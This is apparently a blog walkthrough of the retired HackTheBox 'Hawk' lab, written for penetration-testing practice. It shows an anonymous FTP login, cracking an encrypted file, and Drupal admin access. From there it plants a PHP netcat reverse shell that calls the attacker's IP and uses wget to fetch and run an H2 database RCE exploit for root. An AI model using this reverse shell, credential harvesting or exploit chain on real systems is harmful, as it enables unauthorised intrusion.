<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">HacktheBox Hawk Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-hawk-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-12-02T15:46:28+00:00">December 2, 2018</time><time class="updated" datetime="2025-07-05T12:35:27+00:00">July 5, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to solve another CTF challenge “Hawk”. Hawk is a retired vulnerable lab presented by Hack the Box for helping pentester’s to perform online penetration testing according to your experience level; they have a collection of vulnerable labs as challenges, from beginners to Expert level.</span></p>
<p><span style="color: #000000;"><strong>Level: Easy</strong></span></p>
<p><span style="color: #000000;"><strong>Task: To find user.txt and root.txt</strong></span></p>
<p><span style="color: #000000;">Note: Since these labs are online available therefore they have static IP. The IP of Hawk is 10.10.10.102</span></p>
<h3><span style="color: #800000;"><strong>Penetration Methodology:</strong></span></h3>
<ul>
<li><span style="color: #000000;">Port scanning and IP discovery</span></li>
<li><span style="color: #000000;">Anonymous FTP Login</span></li>
<li><span style="color: #000000;">Checking file type</span></li>
<li><span style="color: #000000;">Getting Login Credentials</span></li>
<li><span style="color: #000000;">Browsing IP through port 80</span></li>
<li><span style="color: #000000;">Exploiting Drupal</span></li>
<li><span style="color: #000000;">Reading First Flag User.txt</span></li>
<li><span style="color: #000000;">Getting Login Credentials</span></li>
<li><span style="color: #000000;">Spawning TTY Shell</span></li>
<li><span style="color: #000000;">Searching exploit via Searchsploit</span></li>
<li><span style="color: #000000;">Getting root Access</span></li>
<li><span style="color: #000000;">Reading Final Flag Root.txt</span></li>
</ul>
<p><span style="color: #000000;"><strong><u>Walkthrough</u></strong></span></p>
<p><span style="color: #000000;">Let’s start off with our basic nmap command to find out the open ports and running services.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 10.10.10.102</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-mMi7PO6lYes/XAP4EdOhw7I/AAAAAAAAbiU/Y2Fuk4TH5QQQnJ-uyWCn4CoTHBbQxg7bACLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">The Nmap output shows various open ports: 21(ftp), 22(ssh), 80 http server (Drupal CMS), 8082 (h2 database http console).</span></p>
<p><span style="color: #000000;">From the NMAP Scan output, we saw that <strong>ftp Port 21</strong> is Open and the next thing that catches our eyes is that it has <strong>Anonymous login allowed</strong>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ftp 10.10.10.102</pre>
<p><span style="color: #000000;">We easily connected to ftp through Anonymous Login. Moving on, after navigating through multiple directories we found a hidden file i.e. “.<em>drupal.txt.enc</em><strong> “</strong>and then we transferred the file to our local machine<strong>.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-hO4Pd1bYeBQ/XAP4FUAzZII/AAAAAAAAbio/QyIN7sJa6RwlmgJ1GWagZ0F59XDXmsPIACLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Since <em>.drupa.txt.enc</em> is encrypted. Let’s check the file type using the<strong> ‘file’ command</strong>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">file .drupal.txt.enc</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Eqq1ZeXiBLQ/XAP4FXLdl3I/AAAAAAAAbik/PD9N7gnSYrQB7j7lkRY39947NaXOScYNACLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">It came out to be <strong>OpenSSL encoded data with a salted password</strong>. Clearly, we need to decrypt the file to get any further clue.</span></p>
<p><span style="color: #000000;">To crack this file, we have used an OpenSSL bruteforce tool which is easily available on GitHub. You can download it from the given below link or can run the following command for downloading and script execution.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/deltaclock/go-openssl-bruteforce.git
./openssl-brute --file /root/.drupal.txt.enc</pre>
<p><span style="color: #000000;">Boom!! We have successfully cracked the file and the <strong>Password Hint</strong> we got is “<em>PencilKeyboardScanner123</em>” this could be the password for CMS Login. Let’s Check it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-ebboSoccwLM/XAP4FhtgpcI/AAAAAAAAbis/8KmXfDFFk2s6ewpeOAguem1NfqzRRb_ygCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">As port 80 is running http server, we open the target machine’s IP address in our browser and found out it’s a <strong>Drupal Login Page</strong>. To Login this page we have used a Basic Username:<strong> admin </strong>and Password<strong>: PencilKeyboardScanner123</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/--ZB7x1U9850/XAP4GNRP-4I/AAAAAAAAbiw/1u1asUKk3bAIWXnan7ip0L5FO8frXnyAgCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;"><strong>Oh yeah!!</strong> We have successfully logged into the admin dashboard. Now go to <strong>modules</strong> and then enable the checkbox for<strong> Path </strong>and <strong>PHP filter.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-GVnX_B81ebs/XAP4GokWHxI/AAAAAAAAbi4/aM0MkDfa8a0_H3L5e5BU9DM9_8vD3Z88gCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">After that go to <strong>Content &gt; Add Content &gt; Basic Page </strong>to create a basic page where we can write malicious code to spawn the web shell. Just give any <strong>title</strong> for your <strong>malicious code</strong>.</span></p>
<p><span style="color: #000000;">Here we have written one-liner code for PHP reverse shell with the help of Pentest Monkey website.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.10 1234 &gt;/tmp/f"); ?&gt;</pre>
<p><span style="color: #000000;">Then select the <strong>Text format </strong>as “PHP code”. Before saving it you should <strong>start netcat listener</strong> on the listening port. So, once the code is executed it will establish a reverse connection.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 1234</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://4.bp.blogspot.com/-I6Vnt8o1Xwg/XAP4GbIExjI/AAAAAAAAbi0/z5qsVa0HfEA42Fvpev6Momy4Z7GJ-q-0gCLcBGAs/s1600/8.png"/></strong></span></p>
<p><span style="color: #000000;">We got a reverse connection of the victim’s machine on our netcat listener. To spawn the proper shell we have used python3 bin bash shell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic"> python3 -c 'import pty;pty.spawn("/bin/bash")'</pre>
<p><span style="color: #000000;">Inside <em>/home/denial</em> we have got to <strong>User.txt</strong> flag, now time to find the root flag. While exploring through directories, we thought of reading the contents of the “<em>settings.php</em>” file, in this file we found the <strong>password: drupal4hawk</strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat settings.php | grep password</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://2.bp.blogspot.com/-7UF7iJTj6nY/XAP4G6RJoGI/AAAAAAAAbi8/qgSavoy-XaQCehRUW1-0wMmPo7SuPA9mQCLcBGAs/s1600/9.png"/></strong></span></p>
<p><span style="color: #000000;">Then with the following command, we switch the user and logged in as user daniel.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">su daniel
Password: drupal4hawk</pre>
<p><span style="color: #000000;">Here we have used Simple phyton3 commands to escape the python3 interpreter.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">&gt;&gt;import pty
&gt;&gt;pty.spawn('/bin/bash')</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LS2CM9NH3DE/XAP4EbPSKkI/AAAAAAAAbiY/z24MjybN0K0hzYBTTNNVD0zDCuElpOzxACLcBGAs/s1600/10.1.png"/></span></p>
<p><span style="color: #000000;">From Nmap scan output we notice that “<em>H2 database running on port 8082”</em>, therefore we search out for H2 database exploit in searchsploit.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">searchsploit H2 database</pre>
<p><span style="color: #000000;">It came out to be a Remote Code Execution. The exploit we have used is highlighted, after that, we have copied the exploit <strong>45506.py</strong> in the <strong>/root </strong>directory and run a Python server to download the file in the target machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">searchsploit -m 45506
python -m SimpleHTTPServer 8080</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-ZAAUhyuaq80/XAP4EcrJZfI/AAAAAAAAbic/eX4VEzhsff44fiMoEAa38tIKI6o9p6N0ACLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Afterward, we have downloaded our exploit <strong>45506.py</strong> in the <strong>/tmp </strong>directory of the target machine. Then Grant the FULL permission to the exploit and execute it using the command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /tmp
wget http://10.10.14.10:8080/45506.py
chmod 777 45506.py
python3 45506.py –H 127.0.0.1:8082
id</pre>
<p><span style="color: #000000;"><strong>Finally!!</strong> We have got the <strong>root access</strong>. Now let’s go and get the <strong>“root.txt”.</strong> We take a look at the content of the file and found our <strong>final flag</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-F1SUpOQcSo0/XAP4FN8D91I/AAAAAAAAbig/TExnDmZ2dNcf9xys7aeujOX5qfVvN4PcwCLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Ashray Gupta is a Security Researcher and Technical Writer at Hacking Articles. Contributing his 2 years in the field of security as a Penetration Tester and Forensic Computer Analyst. Contact <strong><a style="color: #000000;" href="https://www.linkedin.com/in/ashray-gupta-b77221b6/">Here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
